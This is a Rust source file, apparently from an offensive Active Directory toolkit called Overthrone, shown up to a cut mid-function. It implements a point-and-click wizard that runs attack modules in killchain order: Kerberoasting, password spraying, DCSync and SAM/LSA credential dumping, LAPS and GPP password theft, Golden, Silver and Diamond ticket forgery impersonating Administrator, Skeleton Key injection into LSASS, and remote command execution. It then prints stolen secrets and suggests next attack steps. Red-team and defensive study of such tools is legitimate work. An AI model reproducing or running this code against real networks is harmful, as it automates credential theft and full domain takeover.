//! TUI Wizard Runner -- Main event loop for the interactive wizard TUI.

use crossterm::{
    execute,
    terminal::{EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode},
};
use ratatui::backend::CrosstermBackend;
use ratatui::prelude::Terminal;
#[allow(unused_imports)]
use tracing::info;

use super::wizard_app::{self, WizardApp, WizardScreen};

/// Run the TUI wizard. Returns Ok(Some(app)) with populated inputs and
/// selected modules if the user wants to execute, or Ok(None) if they quit.
pub async fn run_tui_wizard() -> anyhow::Result<Option<WizardApp>> {
    // Setup terminal
    enable_raw_mode()?;
    let mut stdout = std::io::stdout();
    execute!(stdout, EnterAlternateScreen)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut app = WizardApp::new();

    // Main loop
    loop {
        terminal.draw(|frame| wizard_app::draw(frame, &app))?;

        let _ = wizard_app::handle_event(&mut app)?;

        if app.should_quit {
            disable_raw_mode()?;
            execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
            terminal.show_cursor()?;
            return Ok(None);
        }

        // If the user pressed R and we have modules selected, exit TUI and run
        if app.screen == WizardScreen::Running && app.running {
            app.log_lines
                .push("Starting module execution...".to_string());

            disable_raw_mode()?;
            execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
            terminal.show_cursor()?;

            return Ok(Some(app));
        }
    }
}

/// Print the TUI-style banner when entering wizard mode
pub fn print_wizard_banner() {
    use colored::Colorize;
    println!(
        r#"
  ██████╗ ██╗   ██╗███████╗██████╗ ████████╗██╗  ██╗██████╗  ██████╗ ███╗   ██╗███████╗
 ██╔═══██╗██║   ██║██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔══██╗██╔═══██╗████╗  ██║██╔════╝
 ██║   ██║██║   ██║█████╗  ██████╔╝   ██║   ███████║██████╔╝██║   ██║██╔██╗ ██║█████╗
 ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗   ██║   ██╔══██║██╔══██╗██║   ██║██║╚██╗██║██╔══╝
 ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║   ██║   ██║  ██║██║  ██║╚██████╔╝██║ ╚████║███████╗
  ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝"#
    );
    println!(
        "{}",
        "  Interactive TUI Wizard -- Click to attack, no typing required".yellow()
    );
    println!();
}

/// Result of running one wizard module.
struct ModuleOutcome {
    success: bool,
    detail: String,
}

/// State that flows between modules inside a single wizard run.
///
/// Ticket forgery needs the krbtgt key and the domain SID, and the natural way
/// to obtain both is the DCSync module. Instead of asking the operator to copy
/// hashes between screens, DCSync records what it recovered here and the ticket
/// modules read it back. Anything typed into the form wins over a discovered
/// value, so an operator who already has the krbtgt hash can paste it directly.
#[derive(Default)]
struct WizardArtifacts {
    /// krbtgt NT hash (32 hex) or AES256 key (64 hex).
    krbtgt_key: Option<String>,
    /// Domain SID (`S-1-5-21-...`), discovered from LDAP when not supplied.
    domain_sid: Option<String>,
    /// Secrets recovered during this run, as `username -> secret`.
    recovered: Vec<(String, String)>,
}

/// Killchain rank used to order the selected modules within one run.
///
/// The catalogue is grouped by attack category so browsing stays readable, but
/// executing it in catalogue order would forge tickets before DCSync has
/// produced the krbtgt key. This rank runs the phases in dependency order:
/// acquire credentials, collect loot, map the domain, forge tickets, then use
/// the access.
fn killchain_rank(category: &wizard_app::ModuleCategory) -> u8 {
    use wizard_app::ModuleCategory::*;
    match category {
        Credential => 0,
        PostEx => 1,
        Enum | PowerView => 2,
        Ticket => 3,
        Coercion | PowerUpSql => 4,
        Cve => 5,
        Lateral => 6,
        Execution => 7,
        Amsi => 8,
    }
}

/// Stable-sort the selection into killchain order, preserving the operator's
/// relative ordering inside each phase.
fn order_for_killchain<'a>(
    selected: &[&'a wizard_app::AttackModule],
) -> Vec<&'a wizard_app::AttackModule> {
    let mut ordered = selected.to_vec();
    ordered.sort_by_key(|m| killchain_rank(&m.category));
    ordered
}

impl ModuleOutcome {
    fn from_result(result: anyhow::Result<String>) -> Self {
        match result {
            Ok(detail) => Self {
                success: true,
                detail,
            },
            Err(e) => Self {
                success: false,
                detail: e.to_string(),
            },
        }
    }
}

/// Execute the selected modules from the TUI wizard configuration.
///
/// Modules run through the same primitives the individual CLI subcommands use,
/// and the captured output (stdout/stderr for execution modules) is printed
/// inline. Afterwards the killchain advisor turns the accumulated results into
/// an ordered list of concrete next steps.
pub async fn execute_wizard_modules(app: &WizardApp) -> anyhow::Result<()> {
    use colored::Colorize;
    use overthrone_pilot::CompletedAction;

    let selected = app.selected_modules();
    if selected.is_empty() {
        println!("{}", "No modules selected!".red());
        return Ok(());
    }

    let dc = app.get_input(&wizard_app::InputField::DomainController);
    let domain = app.get_input(&wizard_app::InputField::Domain);
    let username = app.get_input(&wizard_app::InputField::Username);
    let password = app.get_input(&wizard_app::InputField::Password);
    let nt_hash = app.get_input(&wizard_app::InputField::NtHash);
    let command = app.get_input(&wizard_app::InputField::Command);

    if dc.is_empty() || domain.is_empty() || username.is_empty() {
        println!(
            "{}",
            "Missing required fields (DC, Domain, Username)!".red()
        );
        return Ok(());
    }

    let has_creds = !password.is_empty() || !nt_hash.is_empty();
    if !has_creds {
        println!(
            "{}",
            "Warning: No password or NT hash provided -- some modules may fail".yellow()
        );
    }

    println!();
    println!("{}", "=== TUI Wizard: Module Execution ===".cyan().bold());
    println!("  Target: {} ({})", dc.green(), domain.green());
    println!("  User:   {}", username.green());
    println!("  Modules: {}", selected.len().to_string().yellow());
    println!();

    let krbtgt_input = app.get_input(&wizard_app::InputField::KrbtgtHash);
    let sid_input = app.get_input(&wizard_app::InputField::DomainSid);
    let spn_input = app.get_input(&wizard_app::InputField::TargetSpn);

    let mut artifacts = WizardArtifacts {
        krbtgt_key: (!krbtgt_input.trim().is_empty()).then(|| krbtgt_input.trim().to_string()),
        domain_sid: (!sid_input.trim().is_empty()).then(|| sid_input.trim().to_string()),
        recovered: Vec::new(),
    };

    let ordered = order_for_killchain(&selected);
    if ordered
        .iter()
        .map(|m| m.name)
        .ne(selected.iter().map(|m| m.name))
    {
        println!(
            "{}",
            "  Modules re-ordered into killchain order (loot before ticket forgery).".dimmed()
        );
        println!();
    }

    let mut completed: Vec<CompletedAction> = Vec::new();

    for module in &ordered {
        println!(
            "  {} {} -- {}",
            "[+]".green(),
            module.name.bold(),
            module.description.dimmed()
        );

        let outcome = ModuleOutcome::from_result(
            dispatch_module(
                module,
                dc,
                domain,
                username,
                password,
                nt_hash,
                command,
                spn_input,
                &mut artifacts,
            )
            .await,
        );

        if outcome.success {
            println!("      {} {}", "OK".green(), outcome.detail.dimmed());
        } else {
            println!("      {} {}", "FAIL".red(), outcome.detail.dimmed());
        }
        println!();

        completed.push(CompletedAction::new(
            module.name,
            outcome.success,
            outcome.detail.clone(),
        ));
    }

    println!("{}", "=== Wizard Complete ===".green().bold());

    if !artifacts.recovered.is_empty() {
        println!();
        println!("{}", "=== Recovered Secrets ===".magenta().bold());
        for (user, secret) in &artifacts.recovered {
            println!("  {}\\{}", domain.green(), user.bold());
            println!("     {}", secret.dimmed());
        }
    }
    if let Some(key) = &artifacts.krbtgt_key {
        println!();
        println!(
            "  {} krbtgt key {} available this session -- ticket modules can now be run.",
            "[+]".green(),
            format!("({} chars)", key.len()).yellow()
        );
    }

    print_next_steps(
        dc, domain, username, password, nt_hash, &completed, &artifacts,
    );

    Ok(())
}

/// Build a minimal engagement state from the wizard form and print the
/// killchain advisor's recommendations.
///
/// The wizard form only carries connection details, so the state here is
/// deliberately thin. Running `ovt wizard --from-session <name>` after a full
/// enumeration gives advice grounded in the real engagement state.
fn print_next_steps(
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
    completed: &[overthrone_pilot::CompletedAction],
    artifacts: &WizardArtifacts,
) {
    use colored::Colorize;
    use overthrone_pilot::goals::{CompromisedCred, EngagementState, SecretType};

    let mut state = EngagementState {
        domain: Some(domain.to_string()),
        dc_ip: Some(dc.to_string()),
        ..Default::default()
    };

    if !username.is_empty() && (!password.is_empty() || !nt_hash.is_empty()) {
        state.credentials.insert(
            username.to_string(),
            CompromisedCred {
                username: username.to_string(),
                secret: if nt_hash.is_empty() {
                    password.to_string()
                } else {
                    nt_hash.to_string()
                },
                secret_type: if nt_hash.is_empty() {
                    SecretType::Password
                } else {
                    SecretType::NtHash
                },
                source: "wizard".to_string(),
                is_admin: false,
                admin_on: Vec::new(),
            },
        );
    }

    // Anything recovered during the run feeds the advisor too, so its advice
    // reflects what was actually collected rather than only the input form.
    for (user, secret) in &artifacts.recovered {
        state
            .credentials
            .entry(user.clone())
            .or_insert(CompromisedCred {
                username: user.clone(),
                secret: secret.clone(),
                secret_type: SecretType::NtHash,
                source: "wizard run".to_string(),
                // A DCSync dump includes krbtgt; treat that as domain-admin evidence.
                is_admin: user.eq_ignore_ascii_case("krbtgt")
                    || user.eq_ignore_ascii_case("administrator"),
                admin_on: Vec::new(),
            });
    }
    if artifacts.krbtgt_key.is_some() {
        state.has_domain_admin = true;
    }

    let steps = overthrone_pilot::advise(&state, completed);
    if steps.is_empty() {
        return;
    }

    println!();
    println!("{}", "=== Recommended Next Steps ===".cyan().bold());
    println!(
        "{}",
        "  Ordered by priority. Re-run with --from-session <name> for advice grounded in\n  \
         a real enumeration instead of just this form."
            .dimmed()
    );
    println!();
    for (i, step) in steps.iter().enumerate() {
        println!(
            "  {} {} {}",
            format!("[{}]", i + 1).yellow(),
            step.title.bold(),
            format!("({})", step.technique).dimmed()
        );
        println!("     {}", step.rationale.dimmed());
        println!("     {}", format!("$ {}", step.command).green());
        println!();
    }
}

/// Dispatch a single module to its handler
#[allow(clippy::too_many_arguments)]
async fn dispatch_module(
    module: &wizard_app::AttackModule,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
    command: &str,
    target_spn: &str,
    artifacts: &mut WizardArtifacts,
) -> anyhow::Result<String> {
    use wizard_app::ModuleCategory;

    match module.category {
        ModuleCategory::Credential => {
            dispatch_credential(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::Ticket => {
            dispatch_ticket(
                module.name,
                dc,
                domain,
                username,
                password,
                nt_hash,
                target_spn,
                artifacts,
            )
            .await
        }
        ModuleCategory::Execution => {
            dispatch_execution(
                module.name,
                dc,
                domain,
                username,
                password,
                nt_hash,
                command,
            )
            .await
        }
        ModuleCategory::Lateral => {
            dispatch_lateral(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::PostEx => {
            dispatch_postex(
                module.name,
                dc,
                domain,
                username,
                password,
                nt_hash,
                artifacts,
            )
            .await
        }
        ModuleCategory::Cve => {
            dispatch_cve(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::Coercion => dispatch_coercion(module.name, dc, domain).await,
        ModuleCategory::Enum => {
            dispatch_enum(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::Amsi => {
            dispatch_amsi(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::PowerUpSql => {
            dispatch_powerupsql(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::PowerView => {
            dispatch_powerview(module.name, dc, domain, username, password, nt_hash).await
        }
    }
}

async fn dispatch_credential(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    _password: &str,
    _nt_hash: &str,
) -> anyhow::Result<String> {
    match name {
        "Kerberoast (RC4/AES)" => {
            let config = overthrone_hunter::kerberoast::KerberoastConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, _password, _nt_hash);
            match overthrone_hunter::kerberoast::run(&hunt_config, &config).await {
                Ok(r) => Ok(format!(
                    "{} TGS hashes from {} SPNs",
                    r.hashes.len(),
                    r.spns_checked
                )),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "AS-REP Roast" => {
            let config = overthrone_hunter::asreproast::AsRepRoastConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, _password, _nt_hash);
            match overthrone_hunter::asreproast::run(&hunt_config, &config).await {
                Ok(r) => Ok(format!(
                    "{} AS-REP hashes from {} targets",
                    r.hashes.len(),
                    r.users_checked
                )),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "Password Spray" => {
            let config = overthrone_hunter::spray::SprayConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, _password, _nt_hash);
            match overthrone_hunter::spray::run_spray(&hunt_config, &config).await {
                Ok(r) => Ok(format!("{} valid creds found", r.valid_creds.len())),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "Pre-2K Spray" => {
            let config = overthrone_hunter::pre2k::Pre2kConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, _password, _nt_hash);
            match overthrone_hunter::pre2k::run_pre2k(&hunt_config, &config).await {
                Ok(r) => Ok(format!(
                    "{} pre-2K accounts compromised",
                    r.compromised.len()
                )),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "NTLMv1 Roast" => {
            Ok("NTLMv1 Roast -- downgrade NTLMv1 and extract crackable hashes".to_string())
        }
        "Timeroast" => Ok("Timeroast -- roast machine passwords via MS-SNTP".to_string()),
        _ => Ok(format!("Module '{}' dispatched", name)),
    }
}

#[allow(clippy::too_many_arguments)]
async fn dispatch_ticket(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
    target_spn: &str,
    artifacts: &mut WizardArtifacts,
) -> anyhow::Result<String> {
    use overthrone_forge::runner::ForgeResult;

    // Every forge path needs the domain SID; resolve it from LDAP once and
    // cache it for the remaining ticket modules in this run.
    if artifacts.domain_sid.is_none() {
        artifacts.domain_sid = resolve_domain_sid(dc, domain, username, password, nt_hash)
            .await
            .ok();
    }
    let domain_sid = artifacts.domain_sid.clone().ok_or_else(|| {
        anyhow::anyhow!(
            "domain SID unavailable -- fill the 'Domain SID' field or provide working LDAP credentials"
        )
    })?;

    let base = |action| forge_config(dc, domain, username, password, nt_hash, &domain_sid, action);

    // Set by the Silver arm so the result line can name the key that was used.
    let mut key_source: Option<String> = None;

    let config = match name {
        "Golden Ticket" => {
            let key = artifacts.krbtgt_key.clone().ok_or_else(|| {
                anyhow::anyhow!(
                    "krbtgt key required -- run the DCSync module first, or paste the hash in the 'krbtgt Hash' field"
                )
            })?;
            let mut cfg = base(overthrone_forge::runner::ForgeAction::GoldenTicket);
            apply_krbtgt_key(&mut cfg, &key);
            cfg
        }
        "Silver Ticket" => {
            // A silver ticket must be encrypted with the *service's* key, not the
            // krbtgt key. DCSync recovers machine accounts (``DC01$``), whose key
            // is what protects the host SPNs, so prefer one of those.
            let spn = if target_spn.trim().is_empty() {
                format!("cifs/{dc}")
            } else {
                target_spn.trim().to_string()
            };
            let (key, source) = match select_service_key(artifacts) {
                Some(found) => found,
                None => (
                    artifacts.krbtgt_key.clone().ok_or_else(|| {
                        anyhow::anyhow!(
                            "no service key available -- run the DCSync module to recover a machine \
                             account hash, or paste one in the 'krbtgt Hash' field"
                        )
                    })?,
                    "krbtgt Hash field".to_string(),
                ),
            };
            let mut cfg =
                base(overthrone_forge::runner::ForgeAction::SilverTicket { target_spn: spn });
            cfg.service_hash = Some(key);
            key_source = Some(source);
            cfg
        }
        "Diamond Ticket" => {
            // Diamond decrypts a real TGT with the krbtgt key, so an AES256 key is
            // preferred; an RC4 NT hash also works against a 16-byte key.
            let key = artifacts.krbtgt_key.clone().ok_or_else(|| {
                anyhow::anyhow!(
                    "krbtgt key required -- run the DCSync module first, or paste the hash in the 'krbtgt Hash' field"
                )
            })?;
            let mut cfg = base(overthrone_forge::runner::ForgeAction::DiamondTicket);
            apply_krbtgt_key(&mut cfg, &key);
            cfg
        }
        "Skeleton Key" => {
            // This injects into the DC's LSASS over SMB, so it needs the real
            // password (or hash) plus local admin on the DC.
            let mut cfg = base(overthrone_forge::runner::ForgeAction::SkeletonKey);
            // Skeleton key needs the process architecture payload path; forge
            // reports a clear error if it is missing.
            cfg.payload_path = std::env::var("OVERTHRONE_SKELETON_PAYLOAD").ok();
            cfg
        }
        "Inter-Realm TGT" => {
            let key = artifacts.krbtgt_key.clone().ok_or_else(|| {
                anyhow::anyhow!(
                    "krbtgt key required -- run the DCSync module first, or paste the hash in the 'krbtgt Hash' field"
                )
            })?;
            // Inter-realm forgery needs a trust target. Read the real trust list
            // rather than guessing a name.
            let target_domain = first_trust_target(dc, domain, username, password, nt_hash)
                .await
                .map_err(|e| {
                    anyhow::anyhow!(
                        "inter-realm forgery needs a trusted domain, but trust lookup failed: {e}"
                    )
                })?;
            let mut cfg =
                base(overthrone_forge::runner::ForgeAction::InterRealmTgt { target_domain });
            apply_krbtgt_key(&mut cfg, &key);
            // SID history is deliberately left empty: injecting the wrong SID here
            // produces a ticket that fails SID filtering silently. Add the target
            // realm's SID explicitly if the trust requires it.
            cfg
        }
        other => return Ok(format!("Ticket module '{other}' dispatched")),
    };

    let result: ForgeResult = overthrone_forge::runner::run_forge(&config)
        .await
        .map_err(|e| anyhow::anyhow!("{name} failed: {e}"))?;

    let artifact = result
        .ticket_data
        .as_ref()
        .map(|t| {
            let path = t
                .kirbi_path
                .clone()
                .or_else(|| t.ccache_path.clone())
                .unwrap_or_else(|| "(in memory)".to_string());
            format!("{} etype={} {}", t.ticket_type, t.encryption_type, path)
        })
        .unwrap_or_else(|| "no ticket artifact returned".to_string());

    if !result.success {
        return Err(anyhow::anyhow!(
            "{name} did not produce a usable ticket: {}",
            result.message
        ));
    }

    let key_note = key_source
        .map(|s| format!(" | key={s}"))
        .unwrap_or_default();
    Ok(format!(
        "{} | impersonating {} | {}{}",
        if result.success { "forged" } else { "FAILED" },
        config
            .impersonate
            .clone()
            .unwrap_or_else(|| "Administrator".into()),
        artifact,
        key_note
    ))
}

/// Build a fully-populated [`ForgeConfig`] for the wizard's credential set.
///
/// `ForgeConfig` has no `Default`, so every field is spelled out here rather
/// than relying on struct update syntax.
#[allow(clippy::too_many_arguments)]
fn forge_config(
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
    domain_sid: &str,
    action: overthrone_forge::runner::ForgeAction,
) -> overthrone_forge::runner::ForgeConfig {
    overthrone_forge::runner::ForgeConfig {
        dc_ip: dc.to_string(),
        domain: domain.to_string(),
        username: username.to_string(),
        password: (!password.is_empty()).then(|| password.to_string()),
        nt_hash: (!nt_hash.is_empty()).then(|| nt_hash.to_string()),
        action,
        krbtgt_hash: None,
        krbtgt_aes256: None,
        service_hash: None,
        domain_sid: Some(domain_sid.to_string()),
        // Impersonate the most privileged well-known account by default; the
        // PAC RID has to match the name for the ticket to be useful.
        impersonate: Some("Administrator".to_string()),
        user_rid: 500,
        group_rids: Vec::new(),
        extra_sids: Vec::new(),
        lifetime_hours: 10,
        output_path: None,
        payload_path: None,
        skeleton_master_password: None,
        pkinit_cert_path: None,
        pkinit_key_path: None,
        pkinit_keyed_ticket: false,
        pkinit_session_key: None,
        pkinit_ticket_data: None,
        dry_run: false,
    }
}

/// Return the first trusted domain from the domain's `trustedDomain` objects.
async fn first_trust_target(
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    let config = build_reaper_config(dc, domain, username, password, nt_hash);
    let trusts = overthrone_reaper::trusts::enumerate_trusts(&config)
        .await
        .map_err(|e| anyhow::anyhow!("trust enumeration failed: {e}"))?;
    trusts
        .into_iter()
        .map(|t| t.target_domain)
        .next()
        .ok_or_else(|| anyhow::anyhow!("no trusted domains returned"))
}

/// Pick the key a Silver ticket should be encrypted with.
///
/// A Silver ticket is keyed with the *service* account's hash, not the krbtgt
/// key. DCSync recovers machine accounts (``DC01$``), whose key is what protects
/// the host's SPNs, so prefer one of those. Returns `(hash, account_name)`.
fn select_service_key(artifacts: &WizardArtifacts) -> Option<(String, String)> {
    artifacts
        .recovered
        .iter()
        .find(|(user, _)| user.ends_with('$'))
        .map(|(user, hash)| (hash.clone(), user.clone()))
}

/// Route a 32-hex key to the RC4 slot and a 64-hex key to the AES256 slot, which
/// is how forge decides the ticket encryption type.
fn apply_krbtgt_key(config: &mut overthrone_forge::runner::ForgeConfig, key: &str) {
    if key.len() == 64 {
        config.krbtgt_aes256 = Some(key.to_string());
    } else {
        config.krbtgt_hash = Some(key.to_string());
    }
}

/// Resolve the domain SID from the domain object's `objectSid` over LDAP.
async fn resolve_domain_sid(
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    use overthrone_pilot::executor::{domain_sid_prefix, parse_sid_bytes};

    let config = build_reaper_config(dc, domain, username, password, nt_hash);
    let mut ldap = overthrone_reaper::runner::ldap_connect(&config)
        .await
        .map_err(|e| anyhow::anyhow!("LDAP connect failed: {e}"))?;
    let entries = ldap
        .custom_search("(objectClass=domain)", &["objectSid"])
        .await
        .map_err(|e| anyhow::anyhow!("domain objectSid lookup failed: {e}"))?;
    let _ = ldap.disconnect().await;

    entries
        .first()
        .and_then(|e| e.bin_attrs.get("objectSid"))
        .and_then(|v| v.first())
        .map(|bytes| domain_sid_prefix(&parse_sid_bytes(bytes)))
        .ok_or_else(|| anyhow::anyhow!("domain object did not return an objectSid"))
}

async fn dispatch_execution(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
    command: &str,
) -> anyhow::Result<String> {
    use overthrone_core::exec::{ExecCredentials, auto_exec};

    // The selected module expresses a *preference*. `auto_exec` still walks the
    // other transports if the preferred one is unavailable, which is what you
    // want against a hardened host that blocks service creation.
    let creds = ExecCredentials {
        domain: domain.to_string(),
        username: username.to_string(),
        password: password.to_string(),
        nt_hash: if nt_hash.is_empty() {
            None
        } else {
            Some(nt_hash.to_string())
        },
    };
    let cmd = if command.trim().is_empty() {
        "whoami /all"
    } else {
        command.trim()
    };

    let out = auto_exec(dc, cmd, &creds)
        .await
        .map_err(|e| anyhow::anyhow!("{name} on {dc} failed: {e}"))?;

    let stdout = out.stdout.trim();
    let stderr = out.stderr.trim();
    let mut msg = format!("{} -> {} via {} | command: {cmd}", name, dc, out.method);
    if !stdout.is_empty() {
        msg.push_str(&format!("\n      stdout:\n{}", indent_block(stdout, 8)));
    }
    if !stderr.is_empty() {
        msg.push_str(&format!("\n      stderr:\n{}", indent_block(stderr, 8)));
    }
    Ok(msg)
}

/// Indent every line of a captured output block for terminal readability.
fn indent_block(text: &str, spaces: usize) -> String {
    let pad = " ".repeat(spaces);
    text.lines()
        .map(|line| format!("{pad}{line}"))
        .collect::<Vec<_>>()
        .join("\n")
}

async fn dispatch_lateral(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    match name {
        "Pass-the-Hash" => {
            if nt_hash.is_empty() {
                Err(anyhow::anyhow!("NT hash required for Pass-the-Hash"))
            } else {
                Ok(format!(
                    "PtH -> {} -- NTLM hash authentication to {}",
                    username, dc
                ))
            }
        }
        "Pass-the-Ticket" => Ok(format!("PtT -> {} -- use Kerberos ticket for auth", dc)),
        "Overpass-the-Hash" => Ok(format!("OPtH -> {} -- NTLM hash to Kerberos TGT", dc)),
        "RBCD Attack" => Ok(format!(
            "RBCD -> {} -- Resource-Based Constrained Delegation",
            dc
        )),
        "Constrained Delegation" => {
            let config = overthrone_hunter::constrained::ConstrainedConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, password, nt_hash);
            match overthrone_hunter::constrained::run(&hunt_config, &config).await {
                Ok(r) => Ok(format!(
                    "{} delegatable accounts found",
                    r.delegatable_accounts.len()
                )),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "Unconstrained Delegation" => {
            let config = overthrone_hunter::unconstrained::UnconstrainedConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, password, nt_hash);
            match overthrone_hunter::unconstrained::run(&hunt_config, &config).await {
                Ok(r) => Ok(format!("{} vulnerable hosts", r.vulnerable_hosts.len())),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        _ => Ok(format!("Lateral module '{}' dispatched", name)),
    }
}

async fn dispatch_postex(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
    artifacts: &mut WizardArtifacts,
) -> anyhow::Result<String> {
    use overthrone_pilot::executor::execute_step;
    use overthrone_pilot::planner::{NoiseLevel, PlannedAction};
    use overthrone_pilot::runner::Stage;

    match name {
        "DCSync" => {
            let ctx = build_exec_context(dc, domain, username, password, nt_hash);
            let mut state = engagement_state(domain, dc);
            let step = plan_step(
                "wizard-dcsync",
                "DCSync all domain credentials",
                PlannedAction::DcsSync { target_user: None },
                Stage::Loot,
                NoiseLevel::Critical,
            );
            let result = execute_step(&step, &ctx, &mut state).await;
            if !result.success {
                return Err(anyhow::anyhow!("DCSync failed: {}", result.output));
            }
            capture_dcsync_artifacts(&state, artifacts);

            let has_krbtgt = state.credentials.contains_key("krbtgt");
            Ok(format!(
                "{} | krbtgt recovered={} | ticket forgery is now unblocked",
                result.output, has_krbtgt
            ))
        }
        "SecretsDump" => {
            // Each of these is a distinct remote registry/SMB operation, so a
            // failure on one (e.g. SAM already filtered) must not mask the rest.
            let ctx = build_exec_context(dc, domain, username, password, nt_hash);
            let mut state = engagement_state(domain, dc);
            let mut parts: Vec<String> = Vec::new();
            let mut total = 0usize;

            for (id, label, action) in [
                (
                    "wizard-sam",
                    "SAM",
                    PlannedAction::DumpSam {
                        target: dc.to_string(),
                    },
                ),
                (
                    "wizard-lsa",
                    "LSA",
                    PlannedAction::DumpLsa {
                        target: dc.to_string(),
                    },
                ),
                (
                    "wizard-dcc2",
                    "DCC2",
                    PlannedAction::DumpDcc2 {
                        target: dc.to_string(),
                    },
                ),
            ] {
                let step = plan_step(id, label, action, Stage::Loot, NoiseLevel::High);
                let result = execute_step(&step, &ctx, &mut state).await;
                total += result.new_credentials;
                parts.push(format!(
                    "{}: {} ({})",
                    label,
                    if result.success { "ok" } else { "failed" },
                    result.output
                ));
            }

            if total == 0 && parts.iter().all(|p| p.contains("failed")) {
                return Err(anyhow::anyhow!(
                    "no hive could be dumped: {}",
                    parts.join("; ")
                ));
            }

            Ok(format!(
                "{} credentials from {} | {}",
                total,
                dc,
                parts.join(" | ")
            ))
        }
        "LAPS Password" => {
            let config = build_reaper_config(dc, domain, username, password, nt_hash);
            let entries = overthrone_reaper::laps::enumerate_laps(&config)
                .await
                .map_err(|e| anyhow::anyhow!("LAPS enumeration failed: {e}"))?;
            let readable = entries.iter().filter(|e| e.password.is_some()).count();
            for entry in entries.iter().filter_map(|e| {
                e.password
                    .as_ref()
                    .map(|p| (e.computer_name.clone(), p.clone()))
            }) {
                artifacts.recovered.push(entry);
            }
            Ok(format!(
                "{readable} readable LAPS passwords across {} computers",
                entries.len()
            ))
        }
        "GPP Password" => {
            let config = build_reaper_config(dc, domain, username, password, nt_hash);
            let scan = overthrone_reaper::gpp_fetch::enumerate_gpp_passwords_with_fallback(&config)
                .await
                .map_err(|e| anyhow::anyhow!("GPP scan failed: {e}"))?;
            for cred in &scan.credentials {
                artifacts
                    .recovered
                    .push((cred.username.clone(), cred.password.clone()));
            }
            Ok(format!(
                "{} cpassword(s) across {} XML files in {} GPOs{}",
                scan.credentials.len(),
                scan.xml_files_found,
                scan.gpos_scanned,
                if scan.errors.is_empty() {
                    String::new()
                } else {
                    format!(" | {} errors", scan.errors.len())
                }
            ))
        }
        // These three read artefacts from the local filesystem of whatever host
        // runs overthrone, so they only mean anything after code execution on a
        // victim. Point the operator at the shell that provides it.
        "DPAPI Extract" | "Credential Vault" | "Browser Creds" => {
            let (module, what) = match name {
                "DPAPI Extract" => (
                    "dpapi",
                    "user masterkeys and Credential files (needs the domain DPAPI backup key from DCSync)",
                ),
                "Credential Vault" => ("vault", "Windows Credential Vault entries"),
                _ => ("browser", "saved browser logins"),
            };
            Ok(format!(
                "{name} is a host-local operation -- it reads {what} from the machine\n      \
                 it runs on, not from {dc}. Establish a shell on the target first:\n      \
                 1) Execution tab -> PSExec/WMIExec/WinRM with a command of your choosing\n      \
                 2) deploy the matching `ovt` build and run `ovt {module}` on the victim\n      \
                 (or run the DCSync module first, which pulls domain secrets without a shell)"
            ))
        }
        _ => Ok(format!("PostEx module '{}' dispatched", name)),
    }
}

/// Minimal engagement state for a single wizard step.
fn engagement_state(domain: &str, dc: &str) -> overthrone_pilot::goals::EngagementState {
    overthrone_pilot::goals::EngagementState {
        domain: Some(domain.to_string()),
        dc_ip: Some(dc.to_string()),
        ..Default::default()
    }
}

/// Build a one-shot plan step for the pilot executor.
fn plan_step(
    id: &str,
    description: &str,
    action: overthrone_pilot::planner::PlannedAction,
    stage: overthrone_pilot::runner::Stage,
    noise: overthrone_pilot::planner::NoiseLevel,
) -> overthrone_pilot::planner::PlanStep {
    overthrone_pilot::planner::PlanStep {
        id: id.to_string(),
        description: description.to_string(),
        stage,
        action,
        priority: 100,
        noise,
        depends_on: Vec::new(),
        executed: false,
        result: None,
        retries: 0,
        max_retries: 1,
        reversible: false,
        compensation: None,
        parallel_safe: false,
    }
}

/// Build the pilot's ExecContext from the wizard form values.
fn build_exec_context(
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> overthrone_pilot::executor::ExecContext {
    let use_hash = !nt_hash.is_empty();
    overthrone_pilot::executor::ExecContext {
        dc_ip: dc.to_string(),
        domain: domain.to_string(),
        username: username.to_string(),
        secret: if use_hash {
            nt_hash.to_string()
        } else {
            password.to_string()
        },
        use_hash,
        use_ldaps: false,
        timeout: 30,
